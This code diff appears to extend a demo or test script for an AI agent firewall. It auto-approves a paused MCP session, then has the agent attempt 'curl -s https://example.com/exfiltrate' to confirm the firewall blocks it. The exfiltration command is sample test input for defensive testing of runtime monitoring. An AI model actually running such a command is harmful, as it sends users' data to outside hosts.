@@ -164,6 +164,16 @@ def scene3():
 
 def scene4():
     scene(4, "Runtime intervention")
+
+    # Scene 3 may have PAUSED the session, and a paused session refuses every
+    # call before the firewall ever sees it — correct behavior, but it would
+    # make this scene assert nothing. Releasing it here is not a workaround:
+    # PAUSE is explicitly the outcome a human resolves, so this exercises the
+    # approval path rather than routing around it.
+    st, _ = call("POST", f"/api/v1/mcp/sessions/{SESSION}/approve")
+    if st == 200:
+        step("operator releases the paused session (human-in-the-loop resume)")
+
     step("agent attempts a network call its declared intent forbids")
     out = tool("run_command", {"command": "curl -s https://example.com/exfiltrate"})
     blocked = "Vigil blocked" in out
